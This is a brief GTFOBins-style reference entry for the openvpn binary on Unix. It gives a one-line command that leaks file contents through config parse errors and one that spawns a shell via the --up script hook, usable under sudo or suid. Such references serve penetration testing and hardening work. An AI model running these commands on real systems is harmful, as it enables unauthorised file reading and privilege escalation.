---
type: gtfobin
name: openvpn
platform: Unix
functions: [file-read, shell]
tags: [gtfobin, unix, lotl]
---

# openvpn

## file-read

```bash
openvpn --config /path/to/input-file
```
_The file is actually parsed and the first partial wrong line is returned in an error message._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
openvpn --dev null --script-security 2 --up '/bin/sh -s'
```
**Contexts:** sudo, suid, unprivileged
